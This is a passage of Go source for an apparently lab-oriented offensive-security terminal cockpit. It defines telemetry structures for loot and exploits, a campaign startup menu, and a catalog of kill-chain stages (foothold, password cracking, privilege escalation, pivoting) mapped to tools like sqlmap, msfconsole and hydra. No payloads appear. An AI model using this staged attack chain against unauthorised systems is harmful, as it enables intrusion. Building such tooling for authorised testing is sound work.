package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/charmbracelet/bubbles/help"
	"github.com/charmbracelet/bubbles/key"
	"github.com/charmbracelet/bubbles/spinner"
	"github.com/charmbracelet/bubbles/table"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

type keyMap struct {
	Up          key.Binding
	Down        key.Binding
	Left        key.Binding
	Right       key.Binding
	NextPane    key.Binding
	PrevPane    key.Binding
	NextOption  key.Binding
	PrevOption  key.Binding
	Select      key.Binding
	ScrollUp    key.Binding
	ScrollDown  key.Binding
	Replay      key.Binding
	Fire        key.Binding
	RawToggle   key.Binding
	ModeToggle  key.Binding
	ChainToggle key.Binding
	CoopToggle  key.Binding
	MapToggle   key.Binding
	Refresh     key.Binding
	Quit        key.Binding
}

func (k keyMap) ShortHelp() []key.Binding {
	return []key.Binding{k.Up, k.Down, k.Left, k.Right, k.NextPane, k.PrevPane, k.Select, k.Fire, k.Replay, k.RawToggle, k.ModeToggle, k.ChainToggle, k.CoopToggle, k.MapToggle, k.Refresh, k.Quit}
}

func (k keyMap) FullHelp() [][]key.Binding {
	return [][]key.Binding{
		{k.Up, k.Down, k.Left, k.Right, k.NextPane, k.PrevPane},
		{k.NextOption, k.PrevOption, k.Select, k.Fire, k.ScrollUp, k.ScrollDown, k.Replay, k.RawToggle, k.ModeToggle, k.ChainToggle, k.CoopToggle, k.MapToggle, k.Refresh, k.Quit},
	}
}

type tickMsg time.Time
type replayResultMsg struct {
	Command string
	Err     error
	Output  string
}
type controlResultMsg struct {
	Label   string
	Command string
	Err     error
	Output  string
}

type taxonomyResultMsg struct {
	Label   string
	Command string
	Err     error
	Output  string
}

type pwnedResultMsg struct {
	Label   string
	Command string
	Err     error
	Output  string
}

type lootResultMsg struct {
	Label   string
	Command string
	Err     error
	Output  string
}

type startupResultMsg struct {
	Op     string
	Err    error
	Output string
}

type archGraphResultMsg struct {
	Label   string
	Command string
	Err     error
	Output  string
	NodeID  string
	Role    string
	Target  string
}

type controlAction struct {
	Label       string
	Description string
	Mode        string
	Command     string
	Args        []string
	KaliShell   string
	ActionID    string
	Group       string
	Requires    []string
	ModuleID    string
	Evidence    attackModuleEvidence
}

var (
	kaliToolCacheMu sync.Mutex
	kaliToolCache   = map[string]bool{}
	kaliStateMu     sync.Mutex
	kaliStateCache  = map[string]kaliRuntimeState{}
)

type kaliRuntimeState struct {
	Running bool
	Checked time.Time
}

type attackModule struct {
	ID              string               `json:"id"`
	Mode            string               `json:"mode"`
	Group           string               `json:"group"`
	Runtime         string               `json:"runtime"`
	Label           string               `json:"label"`
	Description     string               `json:"description"`
	CommandTemplate string               `json:"command_template"`
	Requires        []string             `json:"requires"`
	ActionID        string               `json:"action_id"`
	Enabled         bool                 `json:"enabled"`
	Tags            []string             `json:"tags"`
	Inputs          []attackModuleInput  `json:"inputs"`
	Evidence        attackModuleEvidence `json:"evidence"`
}

type attackModuleInput struct {
	Key          string   `json:"key"`
	Label        string   `json:"label"`
	DefaultValue string   `json:"default"`
	Required     bool     `json:"required"`
	InputType    string   `json:"type"`
	Options      []string `json:"options"`
	Min          *int     `json:"min"`
	Max          *int     `json:"max"`
}

type attackModuleEvidence struct {
	LootKind        string `json:"loot_kind"`
	LootName        string `json:"loot_name"`
	FindingSeverity string `json:"finding_severity"`
	FindingTitle    string `json:"finding_title"`
	FindingImpact   string `json:"finding_impact"`
	Phase           string `json:"phase"`
}

type pipelineSpec struct {
	Name    string
	Icon    string
	Label   string
	Summary string
	Stages  []string
	Tools   string
	Outcome string
}

var pipelineCatalog = []pipelineSpec{
	{Name: "prelim", Icon: "PR", Label: "Preliminary", Summary: "Fast target sanity + surface snapshot.", Stages: []string{"Reachability", "Headers/robots", "Quick fingerprints"}, Tools: "curl,nmap,whatweb", Outcome: "Live target profile to choose next move."},
	{Name: "surface-map", Icon: "SM", Label: "Surface Map", Summary: "Map externally reachable paths and services.", Stages: []string{"Port/service map", "Content discovery", "API path discovery"}, Tools: "nmap,ffuf,gobuster", Outcome: "Attack surface index and candidate entry points."},
	{Name: "web-enum", Icon: "WE", Label: "Web Enum", Summary: "Deep web application enumeration.", Stages: []string{"Tech fingerprint", "Dir/file enum", "Endpoint probing"}, Tools: "whatweb,ffuf,nikto", Outcome: "Web vectors with reproducible endpoints."},
	{Name: "vuln-sweep", Icon: "VS", Label: "Vuln Sweep", Summary: "Template-based vulnerability sweep.", Stages: []string{"Template scan", "Version checks", "Candidate finding set"}, Tools: "nuclei,nikto", Outcome: "Prioritized findings for exploit pathing."},
	{Name: "api-probe", Icon: "AP", Label: "API Probe", Summary: "Probe methods, schema and auth surface.", Stages: []string{"Method checks", "OpenAPI probing", "Access validation"}, Tools: "curl,jq,ffuf", Outcome: "API attack hypotheses and request seeds."},
	{Name: "initial-exploit", Icon: "IX", Label: "Initial Exploit", Summary: "Turn confirmed vuln into shell/RCE foothold.", Stages: []string{"Injection/exec", "Exploit module run", "Shell validation"}, Tools: "sqlmap,msfconsole,commix,xsser,searchsploit", Outcome: "Foothold session (web shell/reverse shell/meterpreter)."},
	{Name: "post-enum", Icon: "PE", Label: "Post Enum", Summary: "Enumerate host context after foothold.", Stages: []string{"Identity/system enum", "Service/share enum", "Credential hunt"}, Tools: "enum4linux-ng,smbclient,smbmap,rpcclient,ldapsearch,snmpwalk", Outcome: "Priv-esc and lateral movement candidates."},
	{Name: "password-attacks", Icon: "PA", Label: "Password Attacks", Summary: "Crack/discover credentials from gathered data.", Stages: []string{"Hash cracking", "Online brute tests", "Cred reuse checks"}, Tools: "john,hashcat,hydra,medusa", Outcome: "Valid credentials for escalation/pivot."},
	{Name: "privesc", Icon: "PV", Label: "Privilege Escalation", Summary: "Escalate low-priv shell to root/admin.", Stages: []string{"Local enum", "Exploit candidate match", "Privilege elevation"}, Tools: "searchsploit,msfconsole,linpeas/winpeas", Outcome: "High-priv control on compromised host."},
	{Name: "lateral-pivot", Icon: "LP", Label: "Lateral/Pivot", Summary: "Move from initial host to internal hosts.", Stages: []string{"Internal discovery", "Route/proxy pivot", "Secondary footholds"}, Tools: "nmap,arp-scan,responder,msfconsole", Outcome: "Expanded internal access graph."},
	{Name: "full-escalation", Icon: "FE", Label: "Full Escalation", Summary: "Post-shell one-shot chain (enum->crack->privesc).", Stages: []string{"Post-enum", "Password attacks", "Priv-esc chain"}, Tools: "enum4linux-ng,john,hydra,searchsploit", Outcome: "Rapid path to admin/root objective."},
	{Name: "full-chain", Icon: "FC", Label: "Full Chain", Summary: "End-to-end kill chain from recon to objective.", Stages: []string{"Recon/sweep", "Exploit/foothold", "Escalate/pivot/report"}, Tools: "nuclei,sqlmap,msfconsole,netexec", Outcome: "Complete operation timeline with telemetry."},
}

func tickCmd() tea.Cmd {
	return tea.Tick(250*time.Millisecond, func(t time.Time) tea.Msg { return tickMsg(t) })
}

type serviceEntry struct {
	Name   string `json:"name"`
	Image  string `json:"image"`
	Status string `json:"status"`
	Ports  string `json:"ports"`
}

type stateFile struct {
	LabName      string         `json:"lab_name"`
	TargetName   string         `json:"target_name"`
	TargetURL    string         `json:"target_url"`
	DockerTarget string         `json:"docker_target"`
	TargetKind   string         `json:"target_kind"`
	TargetID     string         `json:"target_id"`
	Network      string         `json:"network"`
	Status       string         `json:"status"`
	Phase        string         `json:"phase"`
	LastUpdated  string         `json:"last_updated"`
	Services     []serviceEntry `json:"services"`
}

type commandEntry struct {
	CommandID     string `json:"command_id"`
	Timestamp     string `json:"timestamp"`
	Phase         string `json:"phase"`
	Tool          string `json:"tool"`
	Command       string `json:"command"`
	Status        string `json:"status"`
	ExitCode      int    `json:"exit_code"`
	DurationMS    int    `json:"duration_ms"`
	OutputPreview string `json:"output_preview"`
}

type findingEntry struct {
	Timestamp string `json:"timestamp"`
	Severity  string `json:"severity"`
	Title     string `json:"title"`
	Endpoint  string `json:"endpoint"`
	Evidence  string `json:"evidence"`
	Impact    string `json:"impact"`
	Phase     string `json:"phase"`
}

type lootEntry struct {
	Timestamp string `json:"timestamp"`
	Kind      string `json:"kind"`
	Name      string `json:"name"`
	Source    string `json:"source"`
	Preview   string `json:"preview"`
}

type exploitEntry struct {
	Timestamp  string `json:"timestamp"`
	Exploit    string `json:"exploit_type"`
	Escalation string `json:"escalation_degree"`
	Novelty    string `json:"novelty"`
	Vector     string `json:"vector"`
	Evidence   string `json:"evidence"`
	Source     string `json:"source"`
}

type splashFrame struct {
	Title  string
	Source string
	Art    string
}

type splashAsset struct {
	Title  string   `json:"title"`
	Source string   `json:"source"`
	Frames []string `json:"frames"`
}

type lootRiskView struct {
	Severity      string
	CriticalIssue string
	Taxonomy      string
}

type taxonomyCategory struct {
	Name          string
	Subcategories []string
}

type taxonomyEntity struct {
	Kind   string
	Label  string
	Detail string
}

type osintTaxonomyPoint struct {
	Key         string
	Token       string
	Marker      string
	Phase       string
	Description string
}

type exploitTaxonomyNode struct {
	Macro string
	Sub   string
}

type exploitSkullMapNode struct {
	Zone        string
	ZoneLabel   string
	Sub         string
	SubLabel    string
	Description string
}

type dbCredentialHint struct {
	Engine   string
	Host     string
	Port     string
	User     string
	Password string
	Database string
}

type exploitMissionStats struct {
	DoneStages     int
	ProgressPct    int
	RiskScore      int
	HealthScore    int
	Exploitability int
	NoiseScore     int
}

type exploitAchievement struct {
	ID       string
	Name     string
	Hint     string
	Points   int
	Unlocked bool
}

type exploitCampaignRating struct {
	OpsecScore      int
	PwnedScore      int
	TraceBurden     int
	NoisyActions    int
	MutatingActions int
	AuthActions     int
}

type attackGraphNode struct {
	ID     string
	Parent string
	Kind   string
	Ref    string
	Label  string
	Depth  int
	Pwned  bool
	Opsec  int
	Detail string
}

type attackGraphEdge struct {
	From   string
	To     string
	Label  string
	Pwned  bool
	Opsec  int
	Detail string
}

type attackGraphNavPos struct {
	Depth int
	Row   int
}

var taxonomyOrder = []taxonomyCategory{
	{Name: "INPUT", Subcategories: []string{"SEED_ENTITY", "SEED_INFRA"}},
	{Name: "DISCOVERY", Subcategories: []string{"ENTITY_EXPANSION", "INFRA_EXPANSION"}},
	{Name: "COLLECTION", Subcategories: []string{"PASSIVE_PULL", "ACTIVE_PULL"}},
	{Name: "PROCESSING", Subcategories: []string{"NORMALIZE", "DEDUPE"}},
	{Name: "ANALYSIS", Subcategories: []string{"CORRELATE", "RISK_SCORE"}},
	{Name: "VALIDATION", Subcategories: []string{"CROSS_CHECK", "GAP_TRACK"}},
	{Name: "REPORTING", Subcategories: []string{"INTEL_EXPORT", "ACTION_BRIEF"}},
}

var osintTaxonomyPoints = []osintTaxonomyPoint{
	{Key: "seed_media_buffer", Token: "<<SEED_INPUT>>", Marker: "SEED INPUT", Phase: "INPUT", Description: "Initial seed intake for entities, infrastructure, media, and context notes."},
	{Key: "collection_app", Token: "<<COLLECTION_LAYER>>", Marker: "COLLECTION LAYER", Phase: "COLLECTION", Description: "Automated collectors and wrappers executed in Kali for raw intake."},
	{Key: "function_key", Token: "<<TARGET_PROFILE>>", Marker: "TARGET PROFILE", Phase: "INPUT", Description: "Operator target profile, scope, and mission objective selection."},
	{Key: "input_channel", Token: "<<DISCOVERY>>", Marker: "DISCOVERY", Phase: "DISCOVERY", Description: "Expansion from seed to linked entities, accounts, domains, and infrastructure."},
	{Key: "main_storage", Token: "<<DATA_STORE>>", Marker: "DATA STORE", Phase: "PROCESSING", Description: "Normalized storage path for collected telemetry and evidence correlation."},
	{Key: "analyst_interface", Token: "<<VERIFICATION_DESK>>", Marker: "VERIFICATION DESK", Phase: "VALIDATION", Description: "Analyst-facing validation view for confirmation and gap tracking."},
	{Key: "normal_flow", Token: "<<PIPELINE_FLOW>>", Marker: "PIPELINE FLOW", Phase: "COLLECTION", Description: "Expected seed → discovery → collection progression for the current entity."},
	{Key: "cpu_core", Token: "<<ANALYSIS_CORE>>", Marker: "ANALYSIS CORE", Phase: "ANALYSIS", Description: "Correlation and graph analysis stage used for risk scoring and patterning."},
	{Key: "output_bus", Token: "<<REPORT_OUTPUT>>", Marker: "REPORT OUTPUT", Phase: "REPORTING", Description: "Action brief and reporting output path for investigative handoff."},
	{Key: "peripherals", Token: "<<SOURCE_ADAPTERS>>", Marker: "SOURCE ADAPTERS", Phase: "COLLECTION", Description: "External APIs, archives, and enrichers feeding additional observations."},
	{Key: "overflow_guard", Token: "<<RISK_GUARDRAILS>>", Marker: "RISK GUARDRAILS", Phase: "VALIDATION", Description: "Pipeline guardrail lane for missing prerequisites and execution failures."},
	{Key: "debug_tool", Token: "<<EVIDENCE_REVIEW>>", Marker: "EVIDENCE REVIEW", Phase: "VALIDATION", Description: "Consistency review checkpoint for replay and evidence integrity."},
	{Key: "backup_path", Token: "<<ARCHIVE_PATH>>", Marker: "ARCHIVE PATH", Phase: "REPORTING", Description: "Evidence archival/export checkpoint before final report generation."},
}

type lootFogStage struct {
	Key         string
	Title       string
	Description string
	Group       string
	Requires    []string
}

var lootFogStages = []lootFogStage{
	{Key: "recon", Title: "Frontal Surface Recon", Description: "Map exposed services and request paths with low-noise discovery.", Group: "Recon", Requires: nil},
	{Key: "surface", Title: "Orbital Surface Expansion", Description: "Expand endpoint and technology surface to build exploit hypotheses.", Group: "Surface", Requires: []string{"recon"}},
	{Key: "breach", Title: "Maxillary Breach Path", Description: "Attempt entry vectors and validate initial compromise paths.", Group: "Exploit", Requires: []string{"recon"}},
	{Key: "access", Title: "Infraorbital Access Chain", Description: "Validate auth paths and establish reusable access footholds.", Group: "Access", Requires: []string{"breach"}},
	{Key: "objective", Title: "Mandibular Objective Control", Description: "Escalate, tamper, and complete objective-grade access.", Group: "Objective", Requires: []string{"access", "tamper"}},
}

var lootFogVisualOrder = []string{"surface", "recon", "breach", "access", "objective"}

type model struct {
	width                   int
	height                  int
	root                    string
	telemetryDir            string
	state                   stateFile
	rawCommands             []commandEntry
	commands                []commandEntry
	findings                []findingEntry
	loot                    []lootEntry
	exploits                []exploitEntry
	attackModules           []attackModule
	tab                     int
	commandIdx              int
	findingIdx              int
	archGraphIdx            int
	archGraphActionIdx      int
	archMapTaxIdx           int
	archMapTreeFocus        bool
	archMapMode             bool
	pwnedTaxIdx             int
	lootIdx                 int
	lootActionIdx           int
	osintTaxIdx             int
	taxonomyMacroIdx        int
	taxonomySubIdx          int
	taxonomySubMode         bool
	commandDetailScroll     int
	findingDetailScroll     int
	lootDetailScroll        int
	lootRawMode             bool
	lootOSINTMode           bool
	lootOnchainMode         bool
	lootFogMode             bool
	lootFogStageIdx         int
	lootFogActionIdx        int
	replayStatus            string
	controlSection          int
	launchIdx               int
	targetIdx               int
	fireIdx                 int
	firePipelineIdx         int
	exploitFireGroupIdx     int
	exploitPipelineMenu     bool
	fireMode                string
	osintDeepIdx            int
	cveTasks                []string
	cveTaskIdx              int
	replayRuns              []string
	replayRunIdx            int
	historyIdx              int
	controlBusy             bool
	controlStatus           string
	controlOutcome          string
	controlUntil            time.Time
	controlPreflightWarning string
	controlLastLabel        string
	controlLastCommand      string
	controlOutput           string
	manualTargetMode        bool
	manualTargetKind        string
	manualTargetInput       string
	osintTargetInput        string
	osintTargetTypeIdx      int
	onchainTargetInput      string
	onchainTargetTypeIdx    int
	onchainNetworkInput     string
	coopCalderaURL          string
	coopCalderaAPIKey       string
	coopOperationName       string
	coopAgentGroup          string
	customCommandInput      string
	customCommandRuntime    string
	customTemplateIdx       int
	moduleInputModuleID     string
	moduleInputKeys         []string
	moduleInputIdx          int
	moduleInputValues       map[string]string
	controlDetailScroll     int
	pwnedFireBusy           bool
	pwnedFireStatus         string
	pwnedFireCommand        string
	pwnedFireOutput         string
	pwnedFireOutcome        string
	pwnedFireUntil          time.Time
	lootFireBusy            bool
	lootFireStatus          string
	lootFireCommand         string
	lootFireOutput          string
	lootFireOutcome         string
	lootFireUntil           time.Time
	lastFindingKey          string
	findingNotice           string
	findingNoticeUntil      time.Time
	taxonomyFireBusy        bool
	taxonomyFireStatus      string
	taxonomyFireCommand     string
	taxonomyFireOutput      string
	taxonomyFireOutcome     string
	taxonomyFireUntil       time.Time
	archGraphBusy           bool
	archGraphStatus         string
	archGraphCommand        string
	archGraphOutput         string
	archGraphLastResult     string
	archGraphLastNodeID     string
	archGraphOutcome        string
	archGraphUntil          time.Time
	archOutputRaw           bool
	archCollapsed           map[string]bool
	archEditEnabled         bool
	archEditMethod          string
	archEditEndpoint        string
	archEditPayload         string
	archEditUseToken        bool
	archEditFieldIdx        int
	exploitInnerTargetIdx   int
	exploitActiveTarget     string
	exploitBruteCredSrcIdx  int
	exploitBruteAuthModeIdx int
	exploitBruteLootCredIdx int
	exploitBruteManualUser  string
	exploitBruteManualPass  string
	exploitBruteManualToken string
	keys                    keyMap
	help                    help.Model
	spinner                 spinner.Model
	splashUntil             time.Time
	splashFrames            []splashFrame
	loadingFrames           []splashFrame
	ready                   bool
	startupActive           bool
	startupScreen           string
	startupIdx              int
	startupRuns             []string
	startupBrowsePath       string
	startupBrowseIdx        int
	startupBrowseMode       string
	startupBrowseStatus     string
	startupBusy             bool
	confirmNewCampaign      bool
}

func initialModel(root string) model {
	telemetryDir := detectTelemetryDir(root)
	showStartup := shouldShowStartupCampaignMenu(root, telemetryDir)
	startupRuns := discoverReplayRuns(root)
	startupBrowsePath := root
	if looksLikeTelemetryDir(root) {
		startupBrowsePath = filepath.Dir(root)
	}
	spin := spinner.New()
	spin.Spinner = spinner.MiniDot
	spin.Style = lipgloss.NewStyle().Foreground(lipgloss.Color("204"))
	return model{
		root:         root,
		telemetryDir: telemetryDir,
		keys: keyMap{
			Up:          key.NewBinding(key.WithKeys("up", "k"), key.WithHelp("↑/k", "up")),
			Down:        key.NewBinding(key.WithKeys("down", "j"), key.WithHelp("↓/j", "down")),
			Left:        key.NewBinding(key.WithKeys("left", "h"), key.WithHelp("←/h", "prev tab")),
			Right:       key.NewBinding(key.WithKeys("right", "l", "tab"), key.WithHelp("→/l", "next tab")),
			NextPane:    key.NewBinding(key.WithKeys("]"), key.WithHelp("]", "next pane")),
			PrevPane:    key.NewBinding(key.WithKeys("["), key.WithHelp("[", "prev pane")),
			NextOption:  key.NewBinding(key.WithKeys("."), key.WithHelp(".", "next option")),
			PrevOption:  key.NewBinding(key.WithKeys(","), key.WithHelp(",", "prev option")),
			Select:      key.NewBinding(key.WithKeys("enter"), key.WithHelp("enter", "select")),
			ScrollUp:    key.NewBinding(key.WithKeys("pgup", "u"), key.WithHelp("pgup/u", "detail up")),
			ScrollDown:  key.NewBinding(key.WithKeys("pgdown", "d"), key.WithHelp("pgdn/d", "detail down")),
			Replay:      key.NewBinding(key.WithKeys("x"), key.WithHelp("x", "replay event")),
			Fire:        key.NewBinding(key.WithKeys("f"), key.WithHelp("f", "fire action")),
			RawToggle:   key.NewBinding(key.WithKeys("v"), key.WithHelp("v", "loot raw")),
			ModeToggle:  key.NewBinding(key.WithKeys("o"), key.WithHelp("o", "mode/scope")),
			ChainToggle: key.NewBinding(key.WithKeys("c"), key.WithHelp("c", "onchain")),
			CoopToggle:  key.NewBinding(key.WithKeys("g"), key.WithHelp("g", "co-op")),
			MapToggle:   key.NewBinding(key.WithKeys("m"), key.WithHelp("m", "arch map")),
			Refresh:     key.NewBinding(key.WithKeys("r"), key.WithHelp("r", "refresh")),
			Quit:        key.NewBinding(key.WithKeys("q", "ctrl+c"), key.WithHelp("q", "quit")),
		},
		help:                    help.New(),
		spinner:                 spin,
		splashUntil:             time.Now().Add(2300 * time.Millisecond),
		splashFrames:            loadSplashFrames(),
		loadingFrames:           loadLoadingFrames(),
		cveTasks:                discoverCVETasks(root),
		fireMode:                "exploit",
		manualTargetKind:        "url",
		manualTargetInput:       defaultTargetSuggestion(),
		osintTargetInput:        "example.com",
		onchainTargetInput:      "0x0000000000000000000000000000000000000000",
		onchainNetworkInput:     "eth-mainnet",
		coopCalderaURL:          defaultCoopCalderaURL(),
		coopCalderaAPIKey:       defaultCoopCalderaAPIKey(),
		coopOperationName:       "h3retik-operation",
		coopAgentGroup:          "red",
		customCommandInput:      "",
		customCommandRuntime:    "kali",
		customTemplateIdx:       0,
		moduleInputValues:       map[string]string{},
		archCollapsed:           map[string]bool{},
		archEditEnabled:         false,
		archEditMethod:          "AUTO",
		archEditEndpoint:        "",
		archEditPayload:         "{}",
		archEditUseToken:        true,
		exploitInnerTargetIdx:   0,
		exploitActiveTarget:     "",
		exploitBruteCredSrcIdx:  0,
		exploitBruteAuthModeIdx: 0,
		exploitBruteLootCredIdx: 0,
		exploitBruteManualUser:  "",
		exploitBruteManualPass:  "",
		exploitBruteManualToken: "",
		startupActive:           showStartup,
		startupScreen:           "menu",
		startupRuns:             startupRuns,
		startupBrowsePath:       startupBrowsePath,
		startupBrowseIdx:        0,
		startupBrowseMode:       "load",
		startupBrowseStatus:     "",
	}
}

func (m model) Init() tea.Cmd {
	return tea.Batch(m.spinner.Tick, tickCmd())
}

func shouldShowStartupCampaignMenu(root, telemetryDir string) bool {
	if looksLikeTelemetryDir(root) && !strings.EqualFold(filepath.Base(root), "telemetry") {
		return false
	}
	for _, name := range []string{"commands.jsonl", "findings.jsonl", "loot.jsonl", "exploits.jsonl"} {
		path := filepath.Join(telemetryDir, name)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		if strings.TrimSpace(string(data)) != "" {
			return false
		}
	}
	return true
}

func startupCmd(root, op string) tea.Cmd {
	return func() tea.Msg {
		switch strings.ToLower(strings.TrimSpace(op)) {
		case "new-campaign":
			ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
			defer cancel()
			cmd := exec.CommandContext(ctx, "python3", "./scripts/telemetryctl.py", "new-campaign")
			cmd.Dir = root
			out, err := cmd.CombinedOutput()
			if ctx.Err() == context.DeadlineExceeded {
				return startupResultMsg{
					Op:     op,
					Err:    fmt.Errorf("new campaign timed out after 45s"),
					Output: string(out),
				}
			}
			return startupResultMsg{Op: op, Err: err, Output: string(out)}
		default:
			return startupResultMsg{Op: op, Err: fmt.Errorf("unsupported startup op: %s", op)}
		}
	}
}

func startupMenuItems() []string {
	return []string{
		"Start New Campaign",
		"Load Campaign From Directory",
		"Load Campaign From File/Path",
		"Import Campaign Into Local Runs",
		"Quit",
	}
}

func browseEntries(path string) []os.DirEntry {
	entries, err := os.ReadDir(path)
	if err != nil {
		return nil
	}
	sort.Slice(entries, func(i, j int) bool {
		if entries[i].IsDir() != entries[j].IsDir() {
			return entries[i].IsDir()
		}
		return strings.ToLower(entries[i].Name()) < strings.ToLower(entries[j].Name())
	})
	return entries
}

func (m *model) handleStartupKey(msg tea.KeyMsg) tea.Cmd {
	if m.startupBusy {
		if key.Matches(msg, m.keys.Quit) {
			return tea.Quit
		}
		return nil
	}
	switch m.startupScreen {
	case "runs":
		switch {
		case key.Matches(msg, m.keys.Up):
			if len(m.startupRuns) > 0 {
				m.startupIdx = clampWrap(m.startupIdx-1, len(m.startupRuns))
			}
		case key.Matches(msg, m.keys.Down):
			if len(m.startupRuns) > 0 {
				m.startupIdx = clampWrap(m.startupIdx+1, len(m.startupRuns))
			}
		case key.Matches(msg, m.keys.Select):
			if len(m.startupRuns) == 0 {
				m.startupBrowseStatus = "no saved campaigns found"
				return nil
			}
			selected := m.startupRuns[clamp(m.startupIdx, 0, len(m.startupRuns)-1)]
			m.telemetryDir = selected
			m.startupActive = false
			m.reload()
			return nil
		case key.Matches(msg, m.keys.PrevPane) || key.Matches(msg, m.keys.Left) || msg.String() == "esc":
			m.startupScreen = "menu"
			m.startupIdx = 0
		case key.Matches(msg, m.keys.Quit):
			return tea.Quit
		}
		return nil
	case "browse":
		entries := browseEntries(m.startupBrowsePath)
		total := len(entries) + 1 // include ".."
		switch {
		case key.Matches(msg, m.keys.Up):
			if total > 0 {
				m.startupBrowseIdx = clampWrap(m.startupBrowseIdx-1, total)
			}
		case key.Matches(msg, m.keys.Down):
			if total > 0 {
				m.startupBrowseIdx = clampWrap(m.startupBrowseIdx+1, total)
			}
		case key.Matches(msg, m.keys.Select):
			if m.startupBrowseIdx == 0 {
				parent := filepath.Dir(m.startupBrowsePath)
				if parent != "" && parent != m.startupBrowsePath {
					m.startupBrowsePath = parent
					m.startupBrowseIdx = 0
				}
				return nil
			}
			entry := entries[clamp(m.startupBrowseIdx-1, 0, len(entries)-1)]
			path := filepath.Join(m.startupBrowsePath, entry.Name())
			if entry.IsDir() {
				if looksLikeTelemetryDir(path) {
					if strings.EqualFold(strings.TrimSpace(m.startupBrowseMode), "import") {
						dest, err := importTelemetryCampaignRun(m.root, path)
						if err != nil {
							m.startupBrowseStatus = "import failed :: " + err.Error()
							return nil
						}
						m.startupRuns = discoverReplayRuns(m.root)
						m.telemetryDir = dest
						m.startupActive = false
						m.startupBrowseStatus = "imported :: " + filepath.Base(dest)
						m.reload()
						return nil
					}
					m.telemetryDir = path
					m.startupActive = false
					m.reload()
					return nil
				}
				m.startupBrowsePath = path
				m.startupBrowseIdx = 0
				return nil
			}
			if strings.EqualFold(entry.Name(), "state.json") && looksLikeTelemetryDir(m.startupBrowsePath) {
				if strings.EqualFold(strings.TrimSpace(m.startupBrowseMode), "import") {
					dest, err := importTelemetryCampaignRun(m.root, m.startupBrowsePath)
					if err != nil {
						m.startupBrowseStatus = "import failed :: " + err.Error()
						return nil
					}
					m.startupRuns = discoverReplayRuns(m.root)
					m.telemetryDir = dest
					m.startupActive = false
					m.startupBrowseStatus = "imported :: " + filepath.Base(dest)
					m.reload()
					return nil
				}
				m.telemetryDir = m.startupBrowsePath
				m.startupActive = false
				m.reload()
				return nil
			}
			if strings.EqualFold(strings.TrimSpace(m.startupBrowseMode), "import") {
				m.startupBrowseStatus = "select a telemetry directory to import"
			} else {
				m.startupBrowseStatus = "select a telemetry directory (contains state.json + jsonl streams)"
			}
		case key.Matches(msg, m.keys.PrevPane) || key.Matches(msg, m.keys.Left) || msg.String() == "esc":
			m.startupScreen = "menu"
			m.startupIdx = 0
			m.startupBrowseMode = "load"
		case key.Matches(msg, m.keys.Quit):
			return tea.Quit
		}
		return nil
	default:
		items := startupMenuItems()
		switch {
		case key.Matches(msg, m.keys.Up):
			m.startupIdx = clampWrap(m.startupIdx-1, len(items))
		case key.Matches(msg, m.keys.Down):
			m.startupIdx = clampWrap(m.startupIdx+1, len(items))
		case key.Matches(msg, m.keys.Select):
			choice := items[clamp(m.startupIdx, 0, len(items)-1)]
			switch choice {
			case "Start New Campaign":
				m.startupBusy = true
				m.startupBrowseStatus = "starting new campaign..."
				return startupCmd(m.root, "new-campaign")
			case "Load Campaign From Directory":
				m.startupRuns = discoverReplayRuns(m.root)
				m.startupScreen = "runs"
				m.startupIdx = 0
			case "Load Campaign From File/Path":
				m.startupScreen = "browse"
				m.startupBrowseMode = "load"
				m.startupBrowsePath = filepath.Dir(m.root)
				if m.startupBrowsePath == "" {
					m.startupBrowsePath = m.root
				}
				m.startupBrowseIdx = 0
			case "Import Campaign Into Local Runs":
				m.startupScreen = "browse"
				m.startupBrowseMode = "import"
				m.startupBrowsePath = filepath.Dir(m.root)
				if m.startupBrowsePath == "" {
					m.startupBrowsePath = m.root
				}
				m.startupBrowseIdx = 0
				m.startupBrowseStatus = "select a telemetry directory to import into local runs"
			case "Quit":
				return tea.Quit
			}
		case key.Matches(msg, m.keys.Quit):
			return tea.Quit
		}
		return nil
	}
}

func (m model) startupCampaignView() string {
	title := lipgloss.NewStyle().Foreground(lipgloss.Color("204")).Bold(true).Render("H3RETIK // CAMPAIGN BOOT")
	sub := lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("select campaign source before cockpit launch")
	lines := []string{title, sub, ""}
	switch m.startupScreen {
	case "runs":
		lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("saved campaigns (telemetry/runs)"))
		if len(m.startupRuns) == 0 {
			lines = append(lines, "no saved campaigns found")
		}
		for i, run := range m.startupRuns {
			prefix := "  "
			style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
			if i == clamp(m.startupIdx, 0, max(0, len(m.startupRuns)-1)) {
				prefix = "▸ "
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			}
			lines = append(lines, style.Render(prefix+filepath.Base(run)))
		}
		lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("enter load  |  esc back"))
	case "browse":
		modeLabel := "load"
		if strings.EqualFold(strings.TrimSpace(m.startupBrowseMode), "import") {
			modeLabel = "import"
		}
		lines = append(lines,
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("browse telemetry folders"),
			metricLine("mode", modeLabel),
			metricLine("path", m.startupBrowsePath),
		)
		entries := browseEntries(m.startupBrowsePath)
		display := []string{"../"}
		for _, entry := range entries {
			name := entry.Name()
			if entry.IsDir() {
				if looksLikeTelemetryDir(filepath.Join(m.startupBrowsePath, name)) {
					name += "/ [campaign]"
				} else {
					name += "/"
				}
			}
			display = append(display, name)
		}
		for i, item := range display {
			prefix := "  "
			style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
			if i == clamp(m.startupBrowseIdx, 0, max(0, len(display)-1)) {
				prefix = "▸ "
				style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
			}
			lines = append(lines, style.Render(prefix+truncate(item, max(24, m.width-14))))
		}
		if strings.EqualFold(strings.TrimSpace(m.startupBrowseMode), "import") {
			lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("enter open/import  |  esc back"))
		} else {
